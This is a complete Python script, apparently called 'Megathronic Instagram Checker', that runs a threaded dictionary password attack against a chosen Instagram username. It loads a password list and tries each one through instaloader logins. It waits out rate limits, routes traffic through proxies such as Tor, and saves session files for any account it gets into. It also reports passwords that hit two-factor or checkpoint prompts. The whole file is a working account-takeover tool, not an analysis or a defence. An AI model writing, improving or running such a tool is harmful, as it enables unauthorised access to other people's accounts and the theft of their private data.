#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import instaloader
from instaloader.exceptions import BadCredentialsException, ConnectionException, TwoFactorAuthRequiredException
import argparse
import os
import platform
import sys
import time
import json
import threading
import requests
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, TextColumn, BarColumn, TimeRemainingColumn
from rich.table import Table
from rich.live import Live
from rich import box

# Global variables
VERSION = "2.0.0"
console = Console()
successful_attempts = []
checkpoint_accounts = []
two_factor_accounts = []
total_attempts = 0
start_time = None

# Operating system detection for terminal clearing
def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

# Save results to file
def save_results(username, results_dir="results"):
    if not os.path.exists(results_dir):
        os.makedirs(results_dir)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{results_dir}/{username}_{timestamp}.json"

    data = {
        "target": username,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "successful": successful_attempts,
        "checkpoint_required": checkpoint_accounts,
        "two_factor_auth": two_factor_accounts,
        "total_attempts": total_attempts
    }

    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

    return filename

# Display ASCII art logo with animation
def print_ascii_art():
    clear_screen()

    # Simple but elegant logo
    logo = [
        "╔══════════════════════════════════════════════════════════╗",
        "║                                                          ║",
        "║   ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗██╗  ██╗ ║",
        "║   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝ ║",
        "║   ██║██╔██╗ ██║███████╗   ██║   ███████║██║     █████╔╝  ║",
        "║   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██╔═██╗  ║",
        "║   ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗██║  ██╗ ║",
        "║   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ║",
        "║                                                          ║",
        "║      C H E C K E R  •  P R O F E S S I O N A L           ║",
        "║                                                          ║",
        "╚══════════════════════════════════════════════════════════╝"
    ]

    # Display logo with fade-in effect
    for line in logo:
        console.print(line, style="bright_cyan")
        time.sleep(0.05)

    # Display version and credits
    console.print("\n[bright_blue]Version 2.0.0 • Professional Edition[/]")
    console.print("[cyan]Developed by Cyze[/] [bright_white]🌹[/]")
    console.print("")

# Password list reader with advanced error handling
def read_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file.readlines() if line.strip()]

        if not passwords:
            console.print("[bold red]Warning: Password file is empty![/]")
            return []

        return passwords
    except FileNotFoundError:
        console.print(f"[bold red]Error: File not found: {filename}[/]")
        console.print("[yellow]Please provide the correct file path.[/]")
        sys.exit(1)
    except UnicodeDecodeError:
        console.print(f"[bold red]Error: Could not decode file: {filename}[/]")
        console.print("[yellow]Please ensure the file is properly encoded (UTF-8 recommended).[/]")
        sys.exit(1)
    except Exception as e:
        console.print(f"[bold red]Error reading password file: {str(e)}[/]")
        sys.exit(1)

# Check Instagram credentials with error handling and proxy support
def check_credentials(username, password, proxy=None, timeout=10):
    global total_attempts
    total_attempts += 1

    L = instaloader.Instaloader(
        quiet=True,
        download_pictures=False,
        download_videos=False,
        download_video_thumbnails=False,
        download_geotags=False,
        download_comments=False,
        save_metadata=False
    )

    # Set timeout for requests
    L.context.request_timeout = timeout

    # Configure proxy if provided
    if proxy:
        try:
            L.context.proxy = proxy
        except Exception as e:
            return False, f"Proxy error: {str(e)}"

    try:
        L.login(username, password)
        # Optionally save session
        session_dir = os.path.join("sessions", username)
        if not os.path.exists(session_dir):
            os.makedirs(session_dir, exist_ok=True)

        session_file = os.path.join(session_dir, f"{username}.session")
        L.save_session_to_file(session_file)

        return True, None
    except BadCredentialsException:
        return False, "incorrect"
    except TwoFactorAuthRequiredException:
        return False, "two_factor_auth"
    except ConnectionException as e:
        if "checkpoint_required" in str(e).lower() or "challenge_required" in str(e).lower():
            return False, "checkpoint"
        elif "rate limit" in str(e).lower() or "too many requests" in str(e).lower():
            return False, "rate_limited"
        else:
            return False, f"connection_error: {str(e)}"
    except Exception as e:
        return False, f"unknown_error: {str(e)}"

# Check Instagram account details (profile picture, followers, etc.)
def fetch_account_info(username):
    try:
        # Using a more modern approach with a proper user agent
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        # First try with the API approach
        response = requests.get(f"https://www.instagram.com/{username}/?__a=1", headers=headers, timeout=10)

        if response.status_code == 200:
            try:
                data = response.json()
                if "graphql" in data and "user" in data["graphql"]:
                    user = data["graphql"]["user"]
                    return {
                        "followers": user.get("edge_followed_by", {}).get("count", 0),
                        "following": user.get("edge_follow", {}).get("count", 0),
                        "posts": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
                        "profile_pic": user.get("profile_pic_url_hd", "")
                    }
            except json.JSONDecodeError:
                pass

        # Fallback to HTML scraping if API method fails
        response = requests.get(f"https://www.instagram.com/{username}/", headers=headers, timeout=10)
        if response.status_code == 200:
            import re
            html = response.text

            # Try to get the account info from the HTML
            try:
                # Extract the JSON data embedded in the HTML
                shared_data_match = re.search(r'window\._sharedData\s*=\s*({.*?});</script>', html)
                if shared_data_match:
                    shared_data = json.loads(shared_data_match.group(1))
                    user_data = shared_data.get("entry_data", {}).get("ProfilePage", [{}])[0].get("graphql", {}).get("user", {})

                    if user_data:
                        return {
                            "followers": user_data.get("edge_followed_by", {}).get("count", 0),
                            "following": user_data.get("edge_follow", {}).get("count", 0),
                            "posts": user_data.get("edge_owner_to_timeline_media", {}).get("count", 0),
                            "profile_pic": user_data.get("profile_pic_url_hd", "")
                        }
            except:
                pass

    except Exception as e:
        console.print(f"[yellow]Warning: Could not fetch account info: {str(e)}[/]")

    return {
        "followers": "Unknown",
        "following": "Unknown",
        "posts": "Unknown",
        "profile_pic": ""
    }

# Display account information in a table
def display_account_info(username):
    info = fetch_account_info(username)

    table = Table(box=box.ROUNDED)
    table.add_column("Target Account", style="cyan")
    table.add_column("Details", style="bright_white")

    table.add_row("Username", f"[bold blue]{username}[/]")
    table.add_row("Followers", str(info["followers"]))
    table.add_row("Following", str(info["following"]))
    table.add_row("Posts", str(info["posts"]))

    console.print(Panel(table, title="[bold cyan]Account Information[/]", border_style="bright_blue"))

# Multi-threading support for faster password checking
def password_cracker(username, passwords, proxy, max_threads=5, delay=1.5, timeout=10):
    global start_time
    start_time = time.time()

    # Create a progress display
    with Progress(
        TextColumn("[bold blue]{task.description}"),
        BarColumn(complete_style="cyan", finished_style="bright_green"),
        TextColumn("[bright_cyan]{task.completed}/{task.total}"),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        # Split passwords into chunks for threading
        password_chunks = [passwords[i:i + max_threads] for i in range(0, len(passwords), max_threads)]
        total_passwords = len(passwords)

        task = progress.add_task("[cyan]Testing passwords...", total=total_passwords)

        for chunk in password_chunks:
            threads = []
            results = [None] * len(chunk)

            for i, password in enumerate(chunk):
                # Define thread target function
                def check_pass(index, pwd):
                    result, error = check_credentials(username, pwd, proxy, timeout)
                    results[index] = (pwd, result, error)

                # Create and start thread
                thread = threading.Thread(target=check_pass, args=(i, password))
                thread.start()
                threads.append(thread)

            # Wait for all threads to complete
            for thread in threads:
                thread.join()

            # Process results
            for pwd, result, error in results:
                progress.update(task, advance=1)

                if result:
                    successful_attempts.append(pwd)
                    console.print(f"[bold green]✓ SUCCESS:[/] Password found: [bold bright_white]{pwd}[/]")
                    return True
                elif error == "checkpoint":
                    checkpoint_accounts.append(pwd)
                    console.print(f"[bold yellow]⚠ CHECKPOINT:[/] Account verification needed with password: [bright_white]{pwd}[/]")
                elif error == "two_factor_auth":
                    two_factor_accounts.append(pwd)
                    console.print(f"[bold magenta]⚠ 2FA:[/] Two-factor authentication enabled with password: [bright_white]{pwd}[/]")
                elif error == "rate_limited":
                    console.print(f"[bold red]⚠ RATE LIMITED:[/] Instagram is limiting requests. Waiting 60 seconds...[/]")
                    time.sleep(60)  # Wait longer when rate limited
                elif "connection_error" in str(error):
                    console.print(f"[bold red]⚠ CONNECTION ERROR:[/] {error}. Retrying...[/]")
                    time.sleep(5)  # Wait after connection errors
                else:
                    console.print(f"[red]✗ FAILED:[/] '{pwd}'")

            # Add delay between chunks to avoid triggering Instagram's anti-bot measures
            time.sleep(delay)

    return False

# Generate a summary report
def show_summary():
    elapsed_time = time.time() - start_time

    table = Table(box=box.ROUNDED)
    table.add_column("Category", style="cyan")
    table.add_column("Count", style="bright_white")

    table.add_row("Total Attempts", str(total_attempts))
    table.add_row("Successful", str(len(successful_attempts)))
    table.add_row("Checkpoint Required", str(len(checkpoint_accounts)))
    table.add_row("Two-Factor Auth", str(len(two_factor_accounts)))
    table.add_row("Failed", str(total_attempts - len(successful_attempts) - len(checkpoint_accounts) - len(two_factor_accounts)))
    table.add_row("Time Elapsed", f"{elapsed_time:.2f} seconds")

    console.print(Panel(table, title="[bold bright_blue]Summary Report[/]", border_style="cyan"))

# Enhanced argument parser with custom styling
def parse_arguments():
    parser = argparse.ArgumentParser(description="Instagram Account Checker", add_help=False)

    # Required arguments
    required = parser.add_argument_group("Required Arguments")
    required.add_argument("-u", "--username", type=str, metavar="", help="Target Instagram username")
    required.add_argument("-p", "--password-file", type=str, metavar="", help="Path to the password list file")

    # Optional arguments
    optional = parser.add_argument_group("Optional Arguments")
    optional.add_argument("--proxy", type=str, metavar="", help="Use proxy (format: protocol://ip:port)")
    optional.add_argument("--threads", type=int, default=3, metavar="", help="Number of concurrent threads (default: 3)")
    optional.add_argument("--delay", type=float, default=1.5, metavar="", help="Delay between attempts in seconds (default: 1.5)")
    optional.add_argument("--timeout", type=int, default=10, metavar="", help="Connection timeout in seconds (default: 10)")
    optional.add_argument("--save", action="store_true", help="Save results to a file")
    optional.add_argument("-h", "--help", action="store_true", help="Show this help message")

    args = parser.parse_args()

    # Display help if requested or if required arguments are missing
    if args.help or not (args.username and args.password_file):
        console.print(Panel("[bold cyan]MEGATHRONIC INSTAGRAM CHECKER[/] - [bright_blue]Advanced Usage Guide[/]",
                           border_style="bright_blue"))

        console.print("[bold cyan]Required Arguments:[/]")
        console.print("  [bright_white]-u, --username[/]      Target Instagram username")
        console.print("  [bright_white]-p, --password-file[/] Path to the password list file")
        console.print()
        console.print("[bold cyan]Optional Arguments:[/]")
        console.print("  [bright_white]--proxy[/]             Use proxy (format: protocol://ip:port)")
        console.print("  [bright_white]--threads[/]           Number of concurrent threads (default: 3)")
        console.print("  [bright_white]--delay[/]             Delay between attempts in seconds (default: 1.5)")
        console.print("  [bright_white]--timeout[/]           Connection timeout in seconds (default: 10)")
        console.print("  [bright_white]--save[/]              Save results to a file")
        console.print("  [bright_white]-h, --help[/]          Show this help message")
        console.print()
        console.print("[bold cyan]Examples:[/]")
        console.print("  [bright_white]python instagram_checker.py -u target_username -p passwords.txt[/]")
        console.print("  [bright_white]python instagram_checker.py -u target_username -p passwords.txt --proxy socks5://127.0.0.1:9050[/]")
        console.print()
        sys.exit(0)

    return args

# Main function with improved structure
def main():
    # Display the animated logo
    print_ascii_art()

    # Parse command line arguments
    args = parse_arguments()
    username = args.username
    password_file = args.password_file
    proxy = args.proxy
    threads = min(args.threads, 10)  # Limit max threads to 10
    delay = max(args.delay, 1.0)  # Ensure minimum delay of 1 second

    # No global timeout setting needed here - we'll pass timeout to functions

    # Show target information
    display_account_info(username)

    # Read passwords
    console.print(f"[cyan]Reading password file: [bright_white]{password_file}[/]")
    passwords = read_passwords(password_file)

    if not passwords:
        console.print("[bold red]No passwords to try. Exiting.[/]")
        sys.exit(1)

    console.print(f"[green]Loaded [bold]{len(passwords)}[/] passwords.[/]")

    # Show proxy information if used
    if proxy:
        console.print(f"[cyan]Using proxy: [bright_white]{proxy}[/]")

    # Confirmation before starting
    console.print()
    console.print("[yellow]Press Enter to start the attack or Ctrl+C to abort...[/]", end="")
    try:
        input()
    except KeyboardInterrupt:
        console.print("\n[bold red]Operation aborted by user.[/]")
        sys.exit(0)

    console.print()
    console.print("[bold bright_blue]Starting password attack...[/]")
    console.print("[yellow]Press Ctrl+C at any time to stop the attack.[/]")
    console.print()

    try:
        # Start the cracking process
        success = password_cracker(username, passwords, proxy, threads, delay, args.timeout)

        # Show summary
        show_summary()

        # Final message
        if success or successful_attempts:
            console.print(f"[bold green]✓ SUCCESS![/] Password found for [bold bright_blue]{username}[/]: [bold bright_white]{successful_attempts[0]}[/]")
        elif checkpoint_accounts:
            console.print(f"[bold yellow]⚠ CHECKPOINT REQUIRED[/] - Potential password(s) found but verification needed")
        elif two_factor_accounts:
            console.print(f"[bold magenta]⚠ TWO-FACTOR AUTH ENABLED[/] - Potential password(s) found but 2FA is enabled")
        else:
            console.print(f"[bold red]✗ NO PASSWORD FOUND[/] - All {len(passwords)} passwords were incorrect")

        # Save results if requested
        if args.save:
            result_file = save_results(username)
            console.print(f"[bright_blue]Results saved to: [bright_white]{result_file}[/]")

    except KeyboardInterrupt:
        console.print("\n[bold yellow]Operation interrupted by user.[/]")
        show_summary()

        if args.save:
            result_file = save_results(username)
            console.print(f"[bright_blue]Partial results saved to: [bright_white]{result_file}[/]")

    except Exception as e:
        console.print(f"[bold red]An unexpected error occurred: {str(e)}[/]")

    # Farewell message
    console.print("\n[bold bright_cyan]Thank you for using Megathronic Instagram Checker![/]")
    console.print("[bright_blue]Developed by Cyze[/] [bright_white]🌹[/]\n")

if __name__ == "__main__":
    main()
